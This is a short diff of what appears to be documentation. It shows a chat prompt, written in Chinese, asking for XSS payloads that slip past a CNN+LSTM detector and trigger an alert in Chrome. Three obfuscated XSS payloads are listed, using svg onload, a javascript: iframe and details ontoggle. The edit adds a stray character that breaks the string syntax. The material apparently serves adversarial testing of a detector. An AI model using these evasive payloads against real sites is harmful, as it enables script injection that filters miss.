@@ -23,7 +23,7 @@
 ```json
 "role": "user", "content": (
 "我正在測試一個基於 CNN+LSTM 的 XSS 檢測系統，我想產生能繞過這個系統，並且能夠在 Chrome 能夠跳窗的 XSS 對抗樣本。"
-"目前成功的 payload 有：\n"
+"目前成功的 payload 有：\n"W
 "<svg/onload=setTimeout('ale'+'rt(1)',100)></svg>\n"
 "<iframe src=\"javascript: setTimeout('ale'+'rt(1)', 100)\"></iframe>\n"
 "<details open ontoggle=\"setTimeout(unescape('%61%6c%65%72%74(1)'), 100)\"></details>\n"
